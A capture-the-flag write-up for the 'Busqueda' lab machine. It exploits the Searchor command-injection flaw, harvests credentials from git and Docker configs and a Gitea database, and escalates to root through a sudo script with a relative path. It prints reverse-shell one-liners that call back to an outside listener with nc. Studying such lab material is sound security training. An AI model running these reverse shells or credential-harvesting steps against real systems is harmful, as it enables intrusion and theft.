
# Busqueda
--

| Parameter | Value |
| --- | --- |
| Machine | **Busqueda** |
| IP address | `10.129.228.217` |
| Primary domain | `searcher.htb` |
| Additional domain | `gitea.searcher.htb` |
| Operating system reported by Nmap | Linux / Ubuntu |
| Web stack recorded in the notes | Apache, Flask, Searchor 2.4.0 |
| Scan time in the original log | `2026-11-04 09:23 EST` |
| Recorded result | A `svc` session, followed by `uid=0(root)` |

## Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Searchor](#2-searchor)
3. [svc Session](#3-svc-session)
4. [Gitea and SSH](#4-gitea-and-ssh)
5. [Docker and MySQL](#5-docker-and-mysql)
6. [Gitea Credentials](#6-gitea-credentials)
7. [Full-checkup](#7-full-checkup)
8. [Results](#8-results)

---

## 1. Reconnaissance

### 1.1. Port Scan

```bash
sudo nmap 10.129.228.217 -sCVS -p- --min-rate 5000
```

| Port | State | Service | Version |
| --- | --- | --- | --- |
| `22/tcp` | open | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 |
| `80/tcp` | open | HTTP | Apache httpd 2.4.52 |

The HTTP server returned a redirect to `http://searcher.htb/`.

<details>
<summary>Full Nmap Output</summary>

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-04 09:23 EST
Nmap scan report for 10.129.228.217
Host is up (0.080s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/

Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

</details>

### 1.2. Local Hostname Mapping

```bash
echo 10.129.228.217 searcher.htb | sudo tee -a /etc/hosts
```

### 1.3. Web Path Enumeration

```bash
gobuster dir -u http://searcher.htb -w /usr/share/wordlists/dirb/common.txt -x py,html,zip,pdf -t 100
```

| Path | HTTP Status | Response Size |
| --- | --- | --- |
| `/search` | **405** | 153 |
| `/server-status` | 403 | 277 |

<details>
<summary>Gobuster Settings and Output</summary>

```text
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://searcher.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf,py,html,zip
[+] Timeout:                 10s

Starting gobuster in directory enumeration mode

/search               (Status: 405) [Size: 153]
/server-status        (Status: 403) [Size: 277]

Progress: 41526 / 41535 (99.98%)
Finished
```

</details>

---

## 2. Searchor

The original notes identify **Flask**, **Searchor 2.4.0**, and **CVE-2023-43364 — Searchor RCE**.

### 2.1. Repository Used

[Herick-Costa / CVE-2023-43364-Searchor-RCE-Exploit](https://github.com/Herick-Costa/CVE-2023-43364-Searchor-RCE-Exploit)

```bash
git clone https://github.com/Herick-Costa/CVE-2023-43364-Searchor-RCE-Exploit.git
cd CVE-2023-43364-Searchor-RCE-Exploit
```

### 2.2. Reading /etc/passwd

```bash
python3 CVE-2023-43364.py http://searcher.htb/search -a "cat /etc/passwd"
```

```text
[*] Executing custom command: cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
sync:x:4:65534:sync:/bin:/bin/sync
...
svc:x:1000:1000:svc:/home/svc:/bin/bash
...
https://www.google.com/search?q=
```

### 2.3. Local Listening Ports

```bash
python3 CVE-2023-43364.py http://searcher.htb/search -a "ss -ltnp"
```

| Local Address | State | Recv-Q | Send-Q | Process, Where Reported |
| --- | --- | --- | --- | --- |
| `127.0.0.1:222` | LISTEN | 0 | 4096 | — |
| `127.0.0.1:5000` | LISTEN | 0 | 128 | `python3`, PID 1572, FDs 6 and 4 |
| `127.0.0.1:3306` | LISTEN | 0 | 4096 | — |
| `127.0.0.1:43055` | LISTEN | 0 | 4096 | — |
| `127.0.0.53%lo:53` | LISTEN | 0 | 4096 | — |
| `0.0.0.0:22` | LISTEN | 0 | 128 | — |
| `127.0.0.1:3000` | LISTEN | 0 | 4096 | — |
| `*:80` | LISTEN | 0 | 511 | — |
| `[::]:22` | LISTEN | 0 | 128 | — |

Additional response text:

```text
[*] Executing custom command: ss -ltnp
https://www.google.com/search?q=
```

### 2.4. User flag

```bash
python3 CVE-2023-43364.py http://searcher.htb/search -a "cat ~/user.txt"
```

```text
[*] Executing custom command: cat ~/user.txt
353db1bb082f0e2de0452b282627da69
https://www.google.com/search?q=
```

---

## 3. svc Session

### 3.1. Command from the Original Notes

```bash
python3 CVE-2023-43364.py http://searcher.htb/search -a "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.227 4444 >/tmp/f"
```

### 3.2. Receiving the Connection

```bash
nc -lnvp 4444 -vv
```

```text
Listening on 0.0.0.0 4444
Connection received on 10.129.228.217 49328
/bin/sh: 0: can't access tty; job control turned off
```

### 3.3. Current User

```bash
whoami
```

```text
svc
```

### 3.4. Web Application Files

```bash
ls -lahi
```

<details>
<summary>File Listing</summary>

```text
total 20K
264653 drwxr-xr-x 4 www-data www-data 4.0K Apr  3  2023 .
 41701 drwxr-xr-x 4 root     root     4.0K Apr  4  2023 ..
265511 -rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
327681 drwxr-xr-x 8 www-data www-data 4.0K Nov  4 10:43 .git
265516 drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
```

</details>

---

## 4. Gitea and SSH

### 4.1. Git Configuration

```bash
cd .git/
ls -lah
```

<details>
<summary>Contents of the .git Directory</summary>

```text
total 52K
drwxr-xr-x 8 www-data www-data 4.0K Nov  4 10:43 .
drwxr-xr-x 4 www-data www-data 4.0K Apr  3  2023 ..
drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3  2023 index
drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4.0K Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4.0K Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4.0K Dec  1  2022 refs
```

</details>

```bash
cat config
```

```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true

[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
    fetch = +refs/heads/*:refs/remotes/origin/*

[branch "main"]
    remote = origin
    merge = refs/heads/main
```

| Field | Value |
| --- | --- |
| Username | `cody` |
| Password | `jh1usoih2bkjaspwe92` |
| New host | `gitea.searcher.htb` |

### 4.2. SSH

```bash
ssh svc@searcher.htb
```

### 4.3. Allowed sudo Commands

```bash
sudo -l
```

```text
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### 4.4. Available system-checkup.py Actions

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

```text
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

    docker-ps      : List running docker containers
    docker-inspect : Inpect a certain docker container
    full-checkup   : Run a full system checkup
```

---

## 5. Docker and MySQL

### 5.1. Containers

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

| Container ID | Image | Command | Created | Status | Ports | Name |
| --- | --- | --- | --- | --- | --- | --- |
| `960873171e2e` | `gitea/gitea:latest` | `"/usr/bin/entrypoint…"` | 3 years ago | Up 10 hours | `127.0.0.1:3000->3000/tcp`, `127.0.0.1:222->22/tcp` | `gitea` |
| `f84a6b33fb5a` | `mysql:8` | `"docker-entrypoint.s…"` | 3 years ago | Up 10 hours | `127.0.0.1:3306->3306/tcp`, `33060/tcp` | `mysql_db` |

### 5.2. mysql_db Configuration

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
```

Environment variables from the response:

```dotenv
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
MYSQL_USER=gitea
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
MYSQL_DATABASE=gitea
```

<details>
<summary>Full Container Configuration</summary>

```json
{
  "Hostname": "f84a6b33fb5a",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "3306/tcp": {},
    "33060/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
  "Cmd": ["mysqld"],
  "Image": "mysql:8",
  "Volumes": {
    "/var/lib/mysql": {}
  },
  "WorkingDir": "",
  "Entrypoint": ["docker-entrypoint.sh"],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "db",
    "com.docker.compose.version": "1.29.2"
  }
}
```

</details>

### 5.3. Connecting to MySQL

```bash
mysql --protocol=TCP -h 127.0.0.1 -P 3306 -u root --password='jI86kGUuj87guWr3RyF'
```

<details>
<summary>MySQL Client Output</summary>

```text
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 785
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql>
```

</details>

### 5.4. The gitea Database

```sql
use gitea
```

```text
Database changed
```

```sql
show tables;
```

The output lists **91 tables**, including `user`.

```sql
select email, passwd, passwd_hash_algo, salt from user;
```

Result: **2 records**. The values are listed in the next section.

---

## 6. Gitea Credentials

### 6.1. administrator Record

| Field | Value |
| --- | --- |
| Email | `administrator@gitea.searcher.htb` |
| Username recorded in the notes | `administrator` |
| passwd_hash_algo | `pbkdf2` |
| Salt | `a378d3f64143b284f104c926b8b49dfb` |
| Password recorded in the notes | `yuiu1hoiu4i5ho1uh` |

**Password hash (`passwd` / `passhash`):**

```text
ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
```

### 6.2. cody Record

| Field | Value |
| --- | --- |
| Email | `cody@gitea.searcher.htb` |
| passwd_hash_algo | `pbkdf2` |
| Salt | `d1db0a75a18e50de754be2aafcad5533` |

**Password hash (`passwd`):**

```text
b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e
```

---

## 7. Full-checkup

### 7.1. Running from /opt/scripts

```bash
cd /opt/scripts/
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

#### Docker containers

```json
{
  "/gitea": "running"
}
```

```json
{
  "/mysql_db": "running"
}
```

#### Docker port mappings

```json
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}
```

#### Apache webhosts

```text
[+] searcher.htb is up
[+] gitea.searcher.htb is up
```

#### PM2 processes

| Field | Value |
| --- | --- |
| id | `0` |
| name | `app` |
| namespace | `default` |
| version | `N/A` |
| mode | `fork` |
| pid | `1572` |
| uptime | `20h` |
| ↺ | `0` |
| status | `online` |
| cpu | `0%` |
| mem | `30.0mb` |
| user | `svc` |
| watching | `disabled` |

End of output:

```text
[+] Done!
```

### 7.2. Recorded Command Sequence

**Creating the file:**

```bash
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.227 9001 >/tmp/f" > /tmp/full-checkup.sh
```

**File permissions:**

```bash
chmod +x /tmp/full-checkup.sh
```

**Listener command:**

```bash
nc -nvlp 9001
```

**Changing the directory and running the command:**

```bash
cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

**Second recorded listener command and its output:**

```bash
nc -lvnp 9001
```

```text
Listening on 0.0.0.0 9001
Connection received on 10.129.228.217 52068
```

### 7.3. Resulting Session Privileges

Command in the `root` session:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 7.4. Root flag

```bash
cat /root/root.txt
```

```text
a558bced7f91f8270dca02af656eacdc
```

---

## 8. Results

| Result | Value |
| --- | --- |
| Initial user | `svc` |
| Final privileges reported by `id` | `uid=0(root) gid=0(root) groups=0(root)` |
| User flag | `353db1bb082f0e2de0452b282627da69` |
| Root flag | `a558bced7f91f8270dca02af656eacdc` |
